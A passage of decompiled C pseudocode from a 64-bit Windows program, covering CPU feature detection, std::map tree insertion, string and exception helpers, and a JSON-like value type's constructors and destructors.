      byte_1400DBD50 = 0;
      goto LABEL_6;
    }
  }
  byte_1400DBD50 = 1;
  if ( !_bittest((const signed int *)&_RCX, 9u) )
    goto LABEL_5;
LABEL_6:
  if ( !v17 || (byte_1400DBD51 = 1, !_bittest((const signed int *)&_RCX, 0x19u)) )
    byte_1400DBD51 = 0;
  if ( !v17 || (byte_1400DBD52 = 1, !(_RCX & 2)) )
    byte_1400DBD52 = 0;
  if ( _bittest((const signed int *)&_RDX, 0x19u) )
  {
    byte_1400DBD4E = 1;
  }
  else
  {
    _RAX = 0x80000000i64;
    __asm { cpuid }
    if ( (unsigned int)_RAX >= 0x80000001 )
    {
      _RAX = 2147483649i64;
      __asm { cpuid }
      byte_1400DBD4E = ((unsigned int)_RDX >> 22) & 1;
    }
  }
  if ( v9 != 1970169159 )
  {
    if ( v9 == 1752462657 && v5 == 1769238117 && v8 == 1145913699 )
    {
      _RAX = 2147483653i64;
      __asm { cpuid }
      v28 = (unsigned __int8)_RCX;
      byte_1400DBD54 = ((unsigned int)_RCX >> 30) & 1;
      goto LABEL_26;
    }
    goto LABEL_25;
  }
  if ( v5 != 1818588270 || v8 != 1231384169 )
  {
LABEL_25:
    v28 = dword_1400D80C0;
    goto LABEL_26;
  }
  byte_1400DBD53 = (v16 & 0xF00) == 3840;
  v28 = 8 * v15;
  byte_1400DBD54 = (v14 >> 30) & 1;
  if ( v6 >= 7 )
  {
    _RAX = 7i64;
    __asm { cpuid }
    byte_1400DBD55 = ((unsigned int)_RBX >> 18) & 1;
  }
LABEL_26:
  result = 64i64;
  if ( !v28 )
    v28 = 64;
  dword_1400D80C0 = v28;
  byte_1400DBD4C = 1;
  return result;
}
// 1400D80C0: using guessed type int dword_1400D80C0;
// 1400DBD4C: using guessed type char byte_1400DBD4C;
// 1400DBD4D: using guessed type char byte_1400DBD4D;
// 1400DBD4E: using guessed type char byte_1400DBD4E;
// 1400DBD4F: using guessed type char byte_1400DBD4F;
// 1400DBD50: using guessed type char byte_1400DBD50;
// 1400DBD51: using guessed type char byte_1400DBD51;
// 1400DBD52: using guessed type char byte_1400DBD52;
// 1400DBD53: using guessed type char byte_1400DBD53;
// 1400DBD54: using guessed type char byte_1400DBD54;
// 1400DBD55: using guessed type char byte_1400DBD55;

//----- (000000014006AE50) ----------------------------------------------------
_QWORD *__fastcall sub_14006AE50(_QWORD *a1, __int64 a2)
{
  __int64 v2; // rsi
  _QWORD *v3; // rax
  _QWORD *v4; // rdi
  signed __int64 v5; // rbx

  v2 = a2;
  v3 = sub_14006CA10(a1);
  v4 = v3;
  *((_WORD *)v3 + 12) = 0;
  v5 = (signed __int64)(v3 + 4);
  if ( v3 != (_QWORD *)-32i64 )
  {
    sub_14006B8F0((__int64)(v3 + 4), v2);
    sub_14006BAD0(v5 + 16);
  }
  return v4;
}
// 14006BAD0: using guessed type __int64 __fastcall sub_14006BAD0(_QWORD);

//----- (000000014006AEC0) ----------------------------------------------------
_QWORD *__fastcall sub_14006AEC0(_QWORD *a1, __int64 a2, unsigned __int8 a3)
{
  __int64 v3; // rbx
  __int64 v4; // rdi
  _QWORD *v5; // rsi
  _QWORD *v6; // rdx
  __int64 **v7; // rcx
  __int64 *i; // rax
  _QWORD *v9; // rcx
  _QWORD *result; // rax

  v3 = *a1;
  v4 = a2;
  v5 = a1;
  *(_QWORD *)(v3 + 8) = sub_14006AF70(a1, *(_QWORD *)(*(_QWORD *)a2 + 8i64), *a1, a3);
  v6 = (_QWORD *)*v5;
  v5[1] = *(_QWORD *)(v4 + 8);
  v7 = (__int64 **)v6[1];
  if ( *((_BYTE *)v7 + 25) )
  {
    *v6 = v6;
    result = (_QWORD *)*v5;
    result[2] = result;
  }
  else
  {
    for ( i = *v7; !*((_BYTE *)i + 25); i = (__int64 *)*i )
      v7 = (__int64 **)i;
    *v6 = v7;
    v9 = *(_QWORD **)(*v5 + 8i64);
    for ( result = (_QWORD *)v9[2]; !*((_BYTE *)result + 25); result = (_QWORD *)result[2] )
      v9 = result;
    *(_QWORD *)(*v5 + 16i64) = v9;
  }
  return result;
}

//----- (000000014006AF70) ----------------------------------------------------
_QWORD *__fastcall sub_14006AF70(_QWORD *a1, __int64 a2, __int64 a3, unsigned __int8 a4)
{
  _QWORD *v4; // rsi
  _QWORD *v5; // rdi
  _QWORD *v6; // rbx
  __int64 v8; // [rsp+58h] [rbp+10h]
  __int64 v9; // [rsp+60h] [rbp+18h]
  unsigned __int8 v10; // [rsp+68h] [rbp+20h]

  v10 = a4;
  v9 = a3;
  v8 = a2;
  v4 = a1;
  v5 = (_QWORD *)*a1;
  if ( !*(_BYTE *)(a2 + 25) )
  {
    v6 = sub_14006AE50(a1, a2 + 32);
    v6[1] = v9;
    *((_BYTE *)v6 + 24) = *(_BYTE *)(v8 + 24);
    if ( *((_BYTE *)v5 + 25) )
      v5 = v6;
    *v6 = sub_14006AF70(v4, *(_QWORD *)v8, (__int64)v6, v10);
    v6[2] = sub_14006AF70(v4, *(_QWORD *)(v8 + 16), (__int64)v6, v10);
  }
  return v5;
}

//----- (000000014006B010) ----------------------------------------------------
_QWORD *__fastcall sub_14006B010(_QWORD *a1, _QWORD *a2, void *a3, _QWORD *a4, __int64 a5, char *a6)
{
  _QWORD *v6; // rbx
  _QWORD *v7; // r10
  unsigned __int64 v8; // rax
  __int64 v9; // rax
  char *v10; // rax
  __int64 *v11; // rcx
  __int64 *v12; // r8
  __int64 *v13; // rdx
  __int64 v14; // rdx
  char *v15; // rdx
  char **v16; // rcx
  _QWORD *v17; // rdx
  _QWORD *v18; // r8
  __int64 v19; // rcx
  _QWORD *v20; // rcx
  __int64 v21; // rdx
  __int64 v22; // rcx
  _QWORD *v23; // rcx
  _QWORD *v24; // rcx

  v6 = a2;
  v7 = a1;
  v8 = a1[1];
  if ( v8 >= 0x38E38E38E38E38Di64 )
  {
    v6 = a6 + 32;
    sub_14006BF10((__int64)(a6 + 48));
    if ( *((_QWORD *)a6 + 4) && (*((_DWORD *)a6 + 10) & 3) == 1 )
      free(*((void **)a6 + 4));
    operator delete(a6);
    std::_Xlength_error("map/set<T> too long");
    __debugbreak();
  }
  v7[1] = v8 + 1;
  *((_QWORD *)a6 + 1) = a4;
  if ( a4 == (_QWORD *)*v7 )
  {
    *(_QWORD *)(*v7 + 8i64) = a6;
    *(_QWORD *)*v7 = a6;
    v9 = *v7;
LABEL_12:
    *(_QWORD *)(v9 + 16) = a6;
    goto LABEL_13;
  }
  if ( !(_BYTE)a3 )
  {
    a4[2] = a6;
    v9 = *v7;
    if ( a4 != *(_QWORD **)(*v7 + 16i64) )
      goto LABEL_13;
    goto LABEL_12;
  }
  *a4 = a6;
  if ( a4 == *(_QWORD **)*v7 )
    *(_QWORD *)*v7 = a6;
LABEL_13:
  v10 = a6;
  while ( !*(_BYTE *)(*((_QWORD *)v10 + 1) + 24i64) )
  {
    v11 = (__int64 *)*((_QWORD *)v10 + 1);
    v12 = (__int64 *)v11[1];
    v13 = (__int64 *)*v12;
    if ( v11 == (__int64 *)*v12 )
    {
      v14 = v12[2];
      if ( *(_BYTE *)(v14 + 24) )
      {
        if ( v10 == (char *)v11[2] )
        {
          v10 = (char *)*((_QWORD *)v10 + 1);
          v15 = (char *)v11[2];
          v11[2] = *(_QWORD *)v15;
          if ( !*(_BYTE *)(*(_QWORD *)v15 + 25i64) )
            *(_QWORD *)(*(_QWORD *)v15 + 8i64) = v11;
          *((_QWORD *)v15 + 1) = v11[1];
          if ( v11 == *(__int64 **)(*v7 + 8i64) )
          {
            *(_QWORD *)(*v7 + 8i64) = v15;
          }
          else
          {
            v16 = (char **)v11[1];
            if ( v10 == *v16 )
              *v16 = v15;
            else
              v16[2] = v15;
          }
          *(_QWORD *)v15 = v10;
          *((_QWORD *)v10 + 1) = v15;
        }
        *(_BYTE *)(*((_QWORD *)v10 + 1) + 24i64) = 1;
        *(_BYTE *)(*(_QWORD *)(*((_QWORD *)v10 + 1) + 8i64) + 24i64) = 0;
        v17 = *(_QWORD **)(*((_QWORD *)v10 + 1) + 8i64);
        v18 = (_QWORD *)*v17;
        *v17 = *(_QWORD *)(*v17 + 16i64);
        v19 = v18[2];
        if ( !*(_BYTE *)(v19 + 25) )
          *(_QWORD *)(v19 + 8) = v17;
        v18[1] = v17[1];
        if ( v17 == *(_QWORD **)(*v7 + 8i64) )
        {
          *(_QWORD *)(*v7 + 8i64) = v18;
        }
        else
        {
          v20 = (_QWORD *)v17[1];
          if ( v17 == (_QWORD *)v20[2] )
            v20[2] = v18;
          else
            *v20 = v18;
        }
        v18[2] = v17;
LABEL_53:
        v17[1] = v18;
        continue;
      }
      *((_BYTE *)v11 + 24) = 1;
      *(_BYTE *)(v14 + 24) = 1;
      *(_BYTE *)(*(_QWORD *)(*((_QWORD *)v10 + 1) + 8i64) + 24i64) = 0;
      v10 = *(char **)(*((_QWORD *)v10 + 1) + 8i64);
    }
    else
    {
      if ( *((_BYTE *)v13 + 24) )
      {
        if ( v10 == (char *)*v11 )
        {
          v10 = (char *)*((_QWORD *)v10 + 1);
          v21 = *v11;
          *v11 = *(_QWORD *)(*v11 + 16);
          v22 = *(_QWORD *)(v21 + 16);
          if ( !*(_BYTE *)(v22 + 25) )
            *(_QWORD *)(v22 + 8) = v10;
          *(_QWORD *)(v21 + 8) = *((_QWORD *)v10 + 1);
          if ( v10 == *(char **)(*v7 + 8i64) )
          {
            *(_QWORD *)(*v7 + 8i64) = v21;
          }
          else
          {
            v23 = (_QWORD *)*((_QWORD *)v10 + 1);
            if ( v10 == (char *)v23[2] )
              v23[2] = v21;
            else
              *v23 = v21;
          }
          *(_QWORD *)(v21 + 16) = v10;
          *((_QWORD *)v10 + 1) = v21;
        }
        *(_BYTE *)(*((_QWORD *)v10 + 1) + 24i64) = 1;
        *(_BYTE *)(*(_QWORD *)(*((_QWORD *)v10 + 1) + 8i64) + 24i64) = 0;
        v17 = *(_QWORD **)(*((_QWORD *)v10 + 1) + 8i64);
        v18 = (_QWORD *)v17[2];
        v17[2] = *v18;
        if ( !*(_BYTE *)(*v18 + 25i64) )
          *(_QWORD *)(*v18 + 8i64) = v17;
        v18[1] = v17[1];
        if ( v17 == *(_QWORD **)(*v7 + 8i64) )
        {
          *(_QWORD *)(*v7 + 8i64) = v18;
        }
        else
        {
          v24 = (_QWORD *)v17[1];
          if ( v17 == (_QWORD *)*v24 )
            *v24 = v18;
          else
            v24[2] = v18;
        }
        *v18 = v17;
        goto LABEL_53;
      }
      *((_BYTE *)v11 + 24) = 1;
      *((_BYTE *)v13 + 24) = 1;
      *(_BYTE *)(*(_QWORD *)(*((_QWORD *)v10 + 1) + 8i64) + 24i64) = 0;
      v10 = *(char **)(*((_QWORD *)v10 + 1) + 8i64);
    }
  }
  *(_BYTE *)(*(_QWORD *)(*v7 + 8i64) + 24i64) = 1;
  *v6 = a6;
  return v6;
}
// 1400A1770: using guessed type void __stdcall std::_Xlength_error(const char *);

//----- (000000014006B2E0) ----------------------------------------------------
_QWORD *__usercall sub_14006B2E0@<rax>(_QWORD *a1@<rdx>, void ***a2@<rcx>, _QWORD *a3@<r8>, __int64 a4@<r9>, __int64 a5)
{
  __int64 v5; // r15
  _QWORD *v6; // rdi
  _QWORD *v7; // r14
  void ***v8; // r12
  _QWORD *result; // rax
  void **v10; // rsi
  void *v11; // r8
  _QWORD *v12; // rbx
  _QWORD *v13; // rax
  _QWORD *v14; // rbx
  __int64 j; // rax
  __int64 i; // rcx
  void *v17; // r8
  void *v18; // r8
  void **v19; // rbx
  __int64 v20; // rax
  void **l; // rax
  __int64 k; // rax
  __int64 v23; // [rsp+38h] [rbp-40h]

  v5 = a4;
  v6 = a3;
  v7 = a1;
  v8 = a2;
  if ( !a2[1] )
  {
    LOBYTE(a3) = 1;
    sub_14006B010(a2, a1, a3, *a2, a4, (char *)a5);
    return v7;
  }
  v10 = *a2;
  if ( a3 == **a2 )
  {
    if ( sub_14006C7F0(a4, (__int64)(a3 + 4)) )
    {
      LOBYTE(v11) = 1;
      sub_14006B010(v8, v7, v11, v6, v5, (char *)a5);
      return v7;
    }
    goto LABEL_42;
  }
  if ( a3 == v10 )
  {
    v12 = v10[2];
    if ( sub_14006C7F0((__int64)(v12 + 4), a4) )
    {
      sub_14006B010(v8, v7, 0i64, v12, v5, (char *)a5);
      return v7;
    }
    goto LABEL_42;
  }
  if ( !sub_14006C7F0(a4, (__int64)(a3 + 4)) )
    goto LABEL_45;
  v13 = v6;
  if ( *((_BYTE *)v6 + 25) )
  {
    v14 = (_QWORD *)v6[2];
  }
  else
  {
    v14 = (_QWORD *)*v6;
    if ( *(_BYTE *)(*v6 + 25i64) )
    {
      for ( i = v6[1]; !*(_BYTE *)(i + 25); i = *(_QWORD *)(i + 8) )
      {
        if ( v13 != *(_QWORD **)i )
          break;
        v13 = (_QWORD *)i;
      }
      v14 = v13;
      if ( !*((_BYTE *)v13 + 25) )
        v14 = (_QWORD *)i;
    }
    else
    {
      for ( j = v14[2]; !*(_BYTE *)(j + 25); j = *(_QWORD *)(j + 16) )
        v14 = (_QWORD *)j;
    }
  }
  if ( sub_14006C7F0((__int64)(v14 + 4), v5) )
  {
    if ( *(_BYTE *)(v14[2] + 25i64) )
    {
      sub_14006B010(v8, v7, 0i64, v14, v5, (char *)a5);
    }
    else
    {
      LOBYTE(v17) = 1;
      sub_14006B010(v8, v7, v17, v6, v5, (char *)a5);
    }
    result = v7;
  }
  else
  {
LABEL_45:
    if ( !sub_14006C7F0((__int64)(v6 + 4), v5) )
      goto LABEL_42;
    v19 = (void **)v6;
    if ( !*((_BYTE *)v6 + 25) )
    {
      v20 = v6[2];
      if ( *(_BYTE *)(v20 + 25) )
      {
        for ( k = v6[1]; !*(_BYTE *)(k + 25); k = *(_QWORD *)(k + 8) )
        {
          if ( v19 != *(void ***)(k + 16) )
            break;
          v19 = (void **)k;
        }
        v19 = (void **)k;
      }
      else
      {
        v19 = (void **)v6[2];
        for ( l = *(void ***)v20; !*((_BYTE *)l + 25); l = (void **)*l )
          v19 = l;
      }
    }
    if ( v19 != v10 && !sub_14006C7F0(v5, (__int64)(v19 + 4)) )
    {
LABEL_42:
      *v7 = *(_QWORD *)sub_14006B5A0(v8, (__int64)&v23, 0i64, v5, (char *)a5);
      return v7;
    }
    if ( *(_BYTE *)(v6[2] + 25i64) )
    {
      sub_14006B010(v8, v7, 0i64, v6, v5, (char *)a5);
    }
    else
    {
      LOBYTE(v18) = 1;
      sub_14006B010(v8, v7, v18, v19, v5, (char *)a5);
    }
    result = v7;
  }
  return result;
}

//----- (000000014006B5A0) ----------------------------------------------------
__int64 __fastcall sub_14006B5A0(_QWORD *a1, __int64 a2, void *a3, __int64 a4, char *a5)
{
  __int64 v5; // r15
  char v6; // r12
  __int64 v7; // rdi
  __int64 **v8; // r13
  __int64 *v9; // rbx
  __int64 *v10; // rsi
  unsigned __int8 v11; // r14
  __int64 *v12; // rbx
  __int64 *j; // rax
  __int64 *i; // rax
  int v16; // [rsp+38h] [rbp-30h]
  _QWORD *v17; // [rsp+70h] [rbp+8h]

  v17 = a1;
  v5 = a4;
  v6 = (char)a3;
  v7 = a2;
  v8 = (__int64 **)*a1;
  v9 = *(__int64 **)(*a1 + 8i64);
  v10 = (__int64 *)*a1;
  v11 = 1;
  if ( !*((_BYTE *)v9 + 25) )
  {
    do
    {
      v10 = v9;
      if ( v6 )
        v11 = sub_14006C7F0((__int64)(v9 + 4), v5) == 0;
      else
        v11 = sub_14006C7F0(v5, (__int64)(v9 + 4));
      if ( v11 )
        v9 = (__int64 *)*v9;
      else
        v9 = (__int64 *)v9[2];
    }
    while ( !*((_BYTE *)v9 + 25) );
    a1 = v17;
  }
  v12 = v10;
  if ( v11 )
  {
    if ( v10 == *v8 )
    {
      LOBYTE(a3) = 1;
      *(_QWORD *)v7 = *sub_14006B010(a1, &v16, a3, v10, v5, a5);
      *(_BYTE *)(v7 + 8) = 1;
      return v7;
    }
    if ( *((_BYTE *)v10 + 25) )
    {
      v12 = (__int64 *)v10[2];
    }
    else if ( *(_BYTE *)(*v10 + 25) )
    {
      for ( i = (__int64 *)v10[1]; !*((_BYTE *)i + 25); i = (__int64 *)i[1] )
      {
        if ( v12 != (__int64 *)*i )
          break;
        v12 = i;
      }
      if ( !*((_BYTE *)v12 + 25) )
        v12 = i;
    }
    else
    {
      v12 = (__int64 *)*v10;
      for ( j = *(__int64 **)(*v10 + 16); !*((_BYTE *)j + 25); j = (__int64 *)j[2] )
        v12 = j;
    }
  }
  if ( sub_14006C7F0((__int64)(v12 + 4), v5) )
  {
    *(_QWORD *)v7 = *sub_14006B010(v17, &v16, (void *)v11, v10, v5, a5);
    *(_BYTE *)(v7 + 8) = 1;
  }
  else
  {
    sub_14006CA70((__int64)v17, a5);
    *(_QWORD *)v7 = v12;
    *(_BYTE *)(v7 + 8) = 0;
  }
  return v7;
}

//----- (000000014006B750) ----------------------------------------------------
_QWORD *__fastcall sub_14006B750(_QWORD *a1, _QWORD *a2, _QWORD *a3, __int64 a4)
{
  __int64 v4; // r14
  _QWORD *v5; // rbx
  _QWORD *v6; // rsi
  _QWORD *i; // rdi

  v4 = a4;
  v5 = a3;
  v6 = a2;
  for ( i = a1; i != v6; i += 4 )
  {
    sub_14006B7C0(v4, v5, i);
    v5 += 4;
  }
  return v5;
}

//----- (000000014006B7C0) ----------------------------------------------------
__int64 __fastcall sub_14006B7C0(__int64 a1, _QWORD *a2, _QWORD *a3)
{
  _QWORD *v3; // rdi
  _QWORD *v4; // rbx
  size_t v5; // r8
  __int64 result; // rax

  v3 = a3;
  v4 = a2;
  if ( a2 )
  {
    a2[3] = 15i64;
    a2[2] = 0i64;
    *(_BYTE *)a2 = 0;
    if ( a3[3] >= 0x10ui64 )
    {
      *a2 = *a3;
      *a3 = 0i64;
    }
    else
    {
      v5 = a3[2] + 1i64;
      if ( v5 )
        memmove(a2, v3, v5);
    }
    v4[2] = v3[2];
    result = v3[3];
    v4[3] = result;
    v3[3] = 15i64;
    v3[2] = 0i64;
    *(_BYTE *)v3 = 0;
  }
  return result;
}

//----- (000000014006B860) ----------------------------------------------------
void __fastcall sub_14006B860(__int64 a1, __int64 a2)
{
  __int64 v2; // rbx

  v2 = a2;
  if ( *(_QWORD *)(a2 + 24) >= 0x10ui64 )
    operator delete(*(void **)a2);
  *(_QWORD *)(v2 + 24) = 15i64;
  *(_QWORD *)(v2 + 16) = 0i64;
  *(_BYTE *)v2 = 0;
}

//----- (000000014006B8A0) ----------------------------------------------------
_QWORD *__fastcall sub_14006B8A0(_QWORD *a1, __int64 a2)
{
  __int64 v2; // rdi
  _QWORD *v3; // rbx
  __int64 v4; // rax

  v2 = a2;
  v3 = a1;
  *a1 = 0i64;
  a1[1] = 0i64;
  sub_14006C9C0();
  *v3 = v4;
  sub_14006AEC0(v3, v2, 0);
  return v3;
}

//----- (000000014006B8F0) ----------------------------------------------------
__int64 __fastcall sub_14006B8F0(__int64 a1, __int64 a2)
{
  unsigned int v2; // eax
  __int64 v3; // rbx
  __int64 v4; // rdi
  _BYTE *v5; // rax
  int v6; // eax

  v2 = *(_DWORD *)(a2 + 8);
  v3 = a2;
  v4 = a1;
  if ( v2 & 3 && *(_QWORD *)a2 )
    v5 = sub_14006DC70(*(void **)a2, (unsigned __int64)v2 >> 2);
  else
    v5 = *(_BYTE **)a2;
  *(_QWORD *)v4 = v5;
  if ( *(_QWORD *)v3 )
    LOBYTE(v6) = (*(_BYTE *)(v3 + 8) & 3) != 0;
  else
    v6 = *(_DWORD *)(v3 + 8) & 3;
  *(_DWORD *)(v4 + 8) &= 0xFFFFFFFC;
  *(_DWORD *)(v4 + 8) |= v6 & 3;
  *(_DWORD *)(v4 + 8) = *(_DWORD *)(v3 + 8) ^ (*(_DWORD *)(v3 + 8) ^ *(_DWORD *)(v4 + 8)) & 3;
  return v4;
}

//----- (000000014006B980) ----------------------------------------------------
std::exception *__fastcall sub_14006B980(std::exception *a1, const struct std::exception *a2)
{
  const struct std::exception *v2; // rbx
  std::exception *v3; // rdi
  signed __int64 v4; // rcx

  v2 = a2;
  v3 = a1;
  std::exception::exception(a1, a2);
  *(_QWORD *)v3 = &off_1400AE4C0;
  v4 = (signed __int64)v3 + 24;
  *(_QWORD *)(v4 + 24) = 15i64;
  *(_QWORD *)(v4 + 16) = 0i64;
  *(_BYTE *)v4 = 0;
  sub_140004DF0((char *)v3 + 24, (_QWORD *)v2 + 3, 0i64, 0xFFFFFFFFFFFFFFFFui64);
  return v3;
}
// 1400A19A8: using guessed type _QWORD std::exception::exception(std::exception *__hidden this, const struct std::exception *);
// 1400AE4C0: using guessed type __int64 (__fastcall *off_1400AE4C0)(void *);

//----- (000000014006B9F0) ----------------------------------------------------
std::exception *__fastcall sub_14006B9F0(std::exception *a1, const struct std::exception *a2)
{
  const struct std::exception *v2; // rbx
  std::exception *v3; // rdi
  signed __int64 v4; // rcx

  v2 = a2;
  v3 = a1;
  std::exception::exception(a1, a2);
  *(_QWORD *)v3 = &off_1400AE4C0;
  v4 = (signed __int64)v3 + 24;
  *(_QWORD *)(v4 + 24) = 15i64;
  *(_QWORD *)(v4 + 16) = 0i64;
  *(_BYTE *)v4 = 0;
  sub_140004DF0((char *)v3 + 24, (_QWORD *)v2 + 3, 0i64, 0xFFFFFFFFFFFFFFFFui64);
  *(_QWORD *)v3 = &off_1400AE4C0;
  return v3;
}
// 1400A19A8: using guessed type _QWORD std::exception::exception(std::exception *__hidden this, const struct std::exception *);
// 1400AE4C0: using guessed type __int64 (__fastcall *off_1400AE4C0)(void *);

//----- (000000014006BA60) ----------------------------------------------------
std::exception *__fastcall sub_14006BA60(std::exception *a1, const struct std::exception *a2)
{
  const struct std::exception *v2; // rbx
  std::exception *v3; // rdi
  signed __int64 v4; // rcx

  v2 = a2;
  v3 = a1;
  std::exception::exception(a1, a2);
  *(_QWORD *)v3 = &off_1400AE4C0;
  v4 = (signed __int64)v3 + 24;
  *(_QWORD *)(v4 + 24) = 15i64;
  *(_QWORD *)(v4 + 16) = 0i64;
  *(_BYTE *)v4 = 0;
  sub_140004DF0((char *)v3 + 24, (_QWORD *)v2 + 3, 0i64, 0xFFFFFFFFFFFFFFFFui64);
  *(_QWORD *)v3 = &off_1400AE4C0;
  return v3;
}
// 1400A19A8: using guessed type _QWORD std::exception::exception(std::exception *__hidden this, const struct std::exception *);
// 1400AE4C0: using guessed type __int64 (__fastcall *off_1400AE4C0)(void *);

//----- (000000014006BC80) ----------------------------------------------------
_QWORD *__fastcall sub_14006BC80(__int64 a1, void **a2)
{
  _QWORD *v2; // rbx
  void *v3; // rcx
  void *v4; // rax

  *(_BYTE *)(a1 + 8) = 4;
  *(_DWORD *)(a1 + 8) |= 0x100u;
  *(_QWORD *)(a1 + 16) = 0i64;
  v2 = (_QWORD *)a1;
  v3 = a2[2];
  v4 = a2;
  if ( (unsigned __int64)a2[3] >= 0x10 )
    v4 = *a2;
  *v2 = sub_14006DAF0(v4, (unsigned int)v3);
  return v2;
}

//----- (000000014006BCD0) ----------------------------------------------------
__int64 __fastcall sub_14006BCD0(__int64 a1, int a2)
{
  *(_BYTE *)(a1 + 8) = 1;
  *(_DWORD *)(a1 + 8) &= 0xFFFFFEFF;
  *(_QWORD *)a1 = a2;
  *(_QWORD *)(a1 + 16) = 0i64;
  return a1;
}

//----- (000000014006BCF0) ----------------------------------------------------
__int64 __fastcall sub_14006BCF0(__int64 a1, double a2)
{
  *(_BYTE *)(a1 + 8) = 3;
  *(_DWORD *)(a1 + 8) &= 0xFFFFFEFF;
  *(double *)a1 = a2;
  *(_QWORD *)(a1 + 16) = 0i64;
  return a1;
}

//----- (000000014006BD10) ----------------------------------------------------
_QWORD *__fastcall sub_14006BD10(__int64 a1, int a2)
{
  _QWORD *v2; // rbx
  _QWORD *v3; // rax
  _QWORD *v4; // rdi
  __int64 v5; // rax

  v2 = (_QWORD *)a1;
  *(_BYTE *)(a1 + 8) = a2;
  *(_DWORD *)(a1 + 8) &= 0xFFFFFEFF;
  *(_QWORD *)(a1 + 16) = 0i64;
  switch ( a2 )
  {
    case 1:
    case 2:
    case 3:
    case 4:
      *(_QWORD *)a1 = 0i64;
      break;
    case 5:
      *(_BYTE *)a1 = 0;
      break;
    case 6:
    case 7:
      v3 = operator new(0x10ui64);
      v4 = v3;
      if ( v3 )
      {
        *v3 = 0i64;
        v3[1] = 0i64;
        sub_14006C9C0();
        *v4 = v5;
      }
      else
      {
        v4 = 0i64;
      }
      *v2 = v4;
      break;
    default:
      return v2;
  }
  return v2;
}

//----- (000000014006BDD0) ----------------------------------------------------
__int64 __fastcall sub_14006BDD0(__int64 a1, __int64 a2)
{
  *(_BYTE *)(a1 + 8) = 1;
  *(_DWORD *)(a1 + 8) &= 0xFFFFFEFF;
  *(_QWORD *)(a1 + 16) = 0i64;
  *(_QWORD *)a1 = a2;
  return a1;
}

//----- (000000014006BDF0) ----------------------------------------------------
__int64 __fastcall sub_14006BDF0(__int64 a1, __int64 a2)
{
  *(_BYTE *)(a1 + 8) = 2;
  *(_DWORD *)(a1 + 8) &= 0xFFFFFEFF;
  *(_QWORD *)(a1 + 16) = 0i64;
  *(_QWORD *)a1 = a2;
  return a1;
}

//----- (000000014006BE10) ----------------------------------------------------
__int64 __fastcall sub_14006BE10(__int64 a1, char a2)
{
  *(_BYTE *)(a1 + 8) = 5;
  *(_DWORD *)(a1 + 8) &= 0xFFFFFEFF;
  *(_QWORD *)(a1 + 16) = 0i64;
  *(_BYTE *)a1 = a2;
  return a1;
}

//----- (000000014006BE30) ----------------------------------------------------
void __fastcall sub_14006BE30(__int64 a1)
{
  __int64 v1; // rbx

  v1 = a1;
  sub_14006BF10(a1 + 16);
  if ( *(_QWORD *)v1 )
  {
    if ( (*(_DWORD *)(v1 + 8) & 3) == 1 )
      free(*(void **)v1);
  }
}

//----- (000000014006BEB0) ----------------------------------------------------
void __fastcall sub_14006BEB0(void *a1)
{
  void *v1; // rcx

  v1 = *(void **)a1;
  if ( v1 )
    free(v1);
}

//----- (000000014006BEC0) ----------------------------------------------------
__int64 __fastcall sub_14006BEC0(__int64 a1)
{
  __int64 v1; // rbx

  v1 = a1;
  *(_QWORD *)a1 = &off_1400AE4C0;
  if ( *(_QWORD *)(a1 + 48) >= 0x10ui64 )
    operator delete(*(void **)(a1 + 24));
  *(_QWORD *)(v1 + 48) = 15i64;
  *(_QWORD *)(v1 + 40) = 0i64;
  *(_BYTE *)(v1 + 24) = 0;
  return std::exception::~exception((std::exception *)v1);
}
// 1400A1988: using guessed type _QWORD std::exception::~exception(std::exception *__hidden this);
// 1400AE4C0: using guessed type __int64 (__fastcall *off_1400AE4C0)(void *);

//----- (000000014006BF10) ----------------------------------------------------
void __fastcall sub_14006BF10(__int64 a1)
{
  int v1; // eax
  __int64 v2; // rbx
  __int64 **v3; // rdi
  char *v4; // rcx
  char *v5; // rbx
  char v6; // [rsp+30h] [rbp+8h]

  v1 = *(char *)(a1 + 8);
  v2 = a1;
  if ( v1 == 4 )
  {
    if ( *(_DWORD *)(a1 + 8) & 0x100 )
      free(*(void **)a1);
  }
  else if ( (unsigned int)(v1 - 6) <= 1 )
  {
    v3 = *(__int64 ***)a1;
    if ( *(_QWORD *)a1 )
    {
      sub_14006DD30(*(__int64 ***)a1, (__int64 *)&v6, **v3, (__int64)*v3);
      operator delete(*v3);
      operator delete(v3);
    }
  }
  v4 = *(char **)(v2 + 16);
  if ( v4 )
  {
    v5 = v4 - 8;
    `eh vector destructor iterator'(v4, 8ui64, *((_DWORD *)v4 - 2), (void (__stdcall *)(void *))sub_14006BEB0);
    operator delete[](v5);
  }
}

//----- (000000014006BFB0) ----------------------------------------------------
__int64 __fastcall sub_14006BFB0(__int64 a1)
{
  __int64 v1; // rdi
  char v2; // dl
  int v3; // er8
  __int64 *v4; // rbx
  int v5; // er8
  unsigned __int16 v6; // dx
  char *v7; // rsi
  int v8; // er8
  __int64 v10; // [rsp+20h] [rbp-28h]
  int v11; // [rsp+28h] [rbp-20h]
  __int64 v12; // [rsp+30h] [rbp-18h]
  char v13; // [rsp+50h] [rbp+8h]

  v1 = a1;
  sub_14006BAD0(&v10);
  v2 = *(_BYTE *)(v1 + 8);
  v3 = v11;
  *(_BYTE *)(v1 + 8) = v11;
  v4 = *(__int64 **)v1;
  v5 = (unsigned __int8)(v3 ^ v2) ^ v3;
  *(_QWORD *)v1 = v10;
  v6 = ((*(_DWORD *)(v1 + 8) >> 8) & 1) << 8;
  *(_DWORD *)(v1 + 8) ^= ((unsigned __int16)v5 ^ (unsigned __int16)*(_DWORD *)(v1 + 8)) & 0x100;
  v7 = *(char **)(v1 + 16);
  *(_QWORD *)(v1 + 16) = v12;
  v8 = ((unsigned __int16)v5 ^ v6) & 0x100 ^ v5;
  v11 = v8;
  if ( (char)v8 == 4 )
  {
    if ( _bittest(&v8, 8u) )
      free(v4);
  }
  else if ( (unsigned int)((char)v8 - 6) <= 1 && v4 )
  {
    sub_14006DD30((__int64 **)v4, (__int64 *)&v13, *(_QWORD *)*v4, *v4);
    operator delete((void *)*v4);
    operator delete(v4);
  }
  if ( v7 )
  {
    `eh vector destructor iterator'(v7, 8ui64, *((_DWORD *)v7 - 2), (void (__stdcall *)(void *))sub_14006BEB0);
    operator delete[](v7 - 8);
  }
  return v1;
}
// 14006BAD0: using guessed type __int64 __fastcall sub_14006BAD0(_QWORD);

//----- (000000014006C0C0) ----------------------------------------------------
signed __int64 __fastcall sub_14006C0C0(__int64 a1, _QWORD *a2)
{
  unsigned __int64 v2; // rax
  __int64 v3; // r9
  _QWORD *v4; // r8
  __int64 v5; // rcx

  v2 = a2[3];
  v3 = a1;
  if ( v2 < 0x10 )
